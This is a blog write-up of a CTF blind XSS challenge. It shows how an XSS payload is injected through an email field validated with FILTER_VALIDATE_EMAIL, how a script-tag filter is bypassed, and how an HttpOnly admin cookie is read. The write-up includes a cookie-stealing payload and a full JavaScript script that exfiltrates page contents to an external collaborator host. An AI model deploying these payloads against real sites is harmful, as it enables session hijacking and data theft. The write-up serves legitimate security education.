---
layout: post
title: BSides-Bangalore CTF - Cookie Tracker Blind XSS Challenge
date: 2024-06-28 10:00 +0530
categories: [ctf, writeup]
tags: [ctf, XSS, web security]
---

## Introduction

This was a blind XSS challenge where the goal was to read the admin's cookie. The given website was called "Cookie Tracker" and had three functionalities:

* Store your cookie.
* See your cookie.
* Report a URL and an email.

![XSS challenge](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/XSS-1.png?raw=true "index.php")

## Initial Approach

Since this was an XSS challenge, my initial idea was to exploit the cookie-saving functionality to inject an XSS payload and then send a link to the admin via the report page to steal their session. So, I created a cookie with a random name and an XSS payload via `index.php`, which got executed. However, I realized that `index.php` simply created a new cookie with the name and value specified, and the cookie view page (`cookies.php`) read our cookie and displayed it without sanitization. To steal the admin's cookie, I needed another XSS vulnerability.

![XSS challenge](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/XSS-2.png?raw=true "cookies.php")

After careful inspection, I found that the report page (`report.php`) used `FILTER_VALIDATE_EMAIL` for the email field, which was vulnerable to XSS. I crafted a payload: `<script>document.location='http://interact-sh_url/?c='+document.cookie</script>`, but there was an error message saying "script tag is blocked" and there was a character limit as well. After some tinkering, I used `<script/src=//myserver/>`, which worked.
![XSS challenge](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/XSS-3.png?raw=true "report.php")

## HttpOnly Cookie Flag Bypass

Next, I created a JavaScript file that retrieved the admin's session and sent it to my collaborator link. After submitting the payload, I received an initial callback to the JS file but not to my collaborator server. I realized I forgot to check the cookie flags, and it turns out the cookie was `HttpOnly`. Now I needed another way to read the `HttpOnly` cookie. That's when I remembered the `cookies.php` file, which displayed our cookies. To read the admin's session, I created a JavaScript script that redirected the admin to `site/cookies.php`, read the content of that page, and sent it to my server. I also asked ChatGPT for assistance and got the following script:

```js
(function(){
  var remote_post = "http://quove1hw80r79vh3lkgi2kv7iyopcf04.oastify.com"; // Your server's full path to POST page

  // Call every couple seconds
  window.setInterval(function(){
    fetchContentAndPost();
  }, 4000);

  function fetchContentAndPost() {
    var targetUrl = window.location.protocol + "//" + window.location.host + "/cookies.php";
    var httpGet = new XMLHttpRequest();
    httpGet.open("GET", targetUrl, true); // Full URL to fetch
    httpGet.onreadystatechange = function() {
      if (httpGet.readyState == 4 && httpGet.status == 200) {
        var content = httpGet.responseText;
        sendToRemoteServer(content);
      }
    }
    httpGet.send();
  }

  function sendToRemoteServer(content) {
    var httpPost = new XMLHttpRequest();
    var params = "data=" + encodeURIComponent(content);
    httpPost.open("POST", remote_post, true);

    // Send the proper header information along with the request
    httpPost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpPost.setRequestHeader("Content-length", params.length);
    httpPost.setRequestHeader("Connection", "close");

    httpPost.onreadystatechange = function() {
      if (httpPost.readyState == 4 && httpPost.status == 200) {
        // Optionally handle the response
      }
    }
    httpPost.send(params);
  }
})();
```


![XSS challenge](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/XSS-4.png?raw=true "Sending XSS payload to admin")

So, I hosted this script on my server and sent a request to the report.php page with the following URL `http://host3.metaproblems.com:6020/report.php?report_url=http://google.com&report_email=%22%3CsCript/src=http://<myip>/3.js%3E%22@x.y` with a random email, and a few seconds later, I got the callback on my collaborator server with the flag.

![XSS challenge](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/XSS-5.png?raw=true "Sending XSS payload to admin")